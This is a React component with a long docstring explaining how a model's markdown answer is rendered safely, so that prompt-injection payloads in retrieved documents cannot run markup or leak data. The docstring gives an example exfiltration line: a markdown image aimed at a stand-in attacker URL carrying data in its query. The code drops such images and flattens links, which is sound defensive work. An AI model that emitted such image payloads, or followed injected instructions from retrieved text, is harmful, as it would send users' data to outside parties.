/**
 * The answer's markdown, rendered as elements rather than shown as syntax.
 *
 * The model is asked (see `SYNTHESIS_PROTOCOL`) for a four-part structure with headings, bullets
 * and — for alarm counts and trends — a table. Rendered as pre-wrapped text, all of that arrived
 * as literal `##`, `**` and `|---|---|`, which is precisely the content an operator scans fastest
 * and so the worst thing to leave unformatted.
 *
 * Markdown, not HTML. `react-markdown` builds React elements from the syntax tree; raw HTML in the
 * source is *not* rendered, because `rehype-raw` is deliberately absent. So the invariant the old
 * plain-text rendering protected still holds: model output partly derived from retrieved documents
 * — the exact path a prompt-injection payload travels — can never become markup that executes.
 * `dangerouslySetInnerHTML` appears nowhere in this codebase.
 *
 * Two element types are overridden rather than rendered, because markdown has two ways to make the
 * browser talk to a third party and both are reachable from a poisoned document:
 *
 * - **Images** are dropped. `![x](https://attacker/?d=…)` is fetched by the browser on render, with
 *   no click required — an exfiltration channel that needs only that the model echo a URL. The alt
 *   text is kept, visibly marked, so a dropped image is evidence rather than a silent hole.
 * - **Links** render as text plus their target in parentheses, never as an anchor. Nothing in this
 *   corpus needs a hyperlink, so a clickable one in model output is all risk and no feature; the
 *   URL is still shown so a reader can see what was attempted.
 *
 * `remark-gfm` is what makes tables work. `remark-breaks` keeps a single newline a line break: the
 * previous `white-space: pre-wrap` did that, and without it a model listing `Suction: 7 bar` and
 * `Vibration: 8 mm/s` on consecutive lines would have them joined into one paragraph.
 *
 * Headings are shifted down a level — the panel's own `<h2>Answer</h2>` sits above this, so a model
 * `#` becomes an `<h3>` and the document outline stays truthful.
 */

import Markdown from 'react-markdown'
import remarkBreaks from 'remark-breaks'
import remarkGfm from 'remark-gfm'
import type { Components } from 'react-markdown'

interface Props {
  children: string
}

/** Every override exists for a reason stated in the module docstring. */
const COMPONENTS: Components = {
  h1: ({ children }) => <h3 className="md__h">{children}</h3>,
  h2: ({ children }) => <h3 className="md__h">{children}</h3>,
  h3: ({ children }) => <h4 className="md__h">{children}</h4>,
  h4: ({ children }) => <h5 className="md__h">{children}</h5>,
  h5: ({ children }) => <h5 className="md__h">{children}</h5>,
  h6: ({ children }) => <h5 className="md__h">{children}</h5>,

  // Wrapped so a table wider than the panel scrolls instead of stretching the layout.
  table: ({ children }) => (
    <div className="md__tablewrap">
      <table>{children}</table>
    </div>
  ),

  a: ({ href, children }) => (
    <>
      {children}
      {href ? <span className="md__url"> ({href})</span> : null}
    </>
  ),

  img: ({ alt }) => (
    <span className="md__dropped">[image removed{alt ? `: ${alt}` : ''}]</span>
  ),
}

export default function AnswerMarkdown({ children }: Props) {
  return (
    <div className="answer__text md">
      <Markdown remarkPlugins={[remarkGfm, remarkBreaks]} components={COMPONENTS}>
        {children}
      </Markdown>
    </div>
  )
}
